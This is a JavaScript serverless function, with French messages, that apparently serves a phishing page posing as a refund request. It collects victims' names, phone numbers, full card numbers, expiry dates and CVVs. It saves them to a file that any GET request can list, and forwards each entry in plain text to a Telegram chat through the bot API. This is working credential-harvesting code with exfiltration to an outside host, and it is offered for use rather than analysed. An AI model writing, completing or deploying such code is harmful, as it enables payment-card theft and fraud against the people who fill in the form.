const https = require('https');
const fs = require('fs');

function loadDemandes() {
  try {
    if (fs.existsSync('/tmp/demandes.json')) {
      return JSON.parse(fs.readFileSync('/tmp/demandes.json', 'utf8'));
    }
  } catch {}
  return [];
}

function saveDemande(entry) {
  try {
    const demandes = loadDemandes();
    demandes.push(entry);
    fs.writeFileSync('/tmp/demandes.json', JSON.stringify(demandes, null, 2), 'utf8');
  } catch {}
}

function json(statusCode, body) {
  return {
    statusCode,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  };
}

function isTelegramConfigured() {
  return Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID);
}

function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text: message });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
      timeout: 10000,
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          if (json.ok) resolve(json);
          else reject(new Error(json.description || 'Telegram API error'));
        } catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    req.write(postData);
    req.end();
  });
}

exports.handler = async (event) => {
  if (event.httpMethod === 'GET') {
    return json(200, { demandes: loadDemandes() });
  }

  if (event.httpMethod !== 'POST') {
    return json(405, { error: 'Methode non autorisee.' });
  }

  let body;
  try {
    body = JSON.parse(event.body || '{}');
  } catch {
    return json(400, { error: 'Donnees invalides.' });
  }

  const { nom, telephone, rib, nomCompte, date, CVV } = body;

  if (!nom || !telephone || !rib || !nomCompte || !date || !CVV) {
    return json(400, { error: 'Tous les champs sont obligatoires.' });
  }

  const cardNumber = String(rib).replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return json(400, { error: 'Le numero de carte doit contenir exactement 16 chiffres.' });
  }

  if (!/^\d{3}$/.test(String(CVV))) {
    return json(400, { error: 'Le CVV doit contenir exactement 3 chiffres.' });
  }

  const entry = { id: Date.now(), dateReception: new Date().toISOString(), nom, telephone, rib: cardNumber, nomCompte, date, CVV };
  saveDemande(entry);

  if (!isTelegramConfigured()) {
    return json(200, { success: true, message: 'Demande enregistree (Telegram non configure).' });
  }

  const message = `Nouvelle demande de remboursement\n\nNom: ${nom}\nTelephone: ${telephone}\nRIB/Carte: ${cardNumber}\nNom du compte: ${nomCompte}\nDate: ${date}\nCVV: ${CVV}`;

  try {
    await sendToTelegram(message);
    return json(200, { success: true, message: 'Votre demande a ete envoyee avec succes.' });
  } catch (err) {
    return json(200, { success: true, message: 'Demande enregistree. Telegram non envoye.', error: err.message });
  }
};
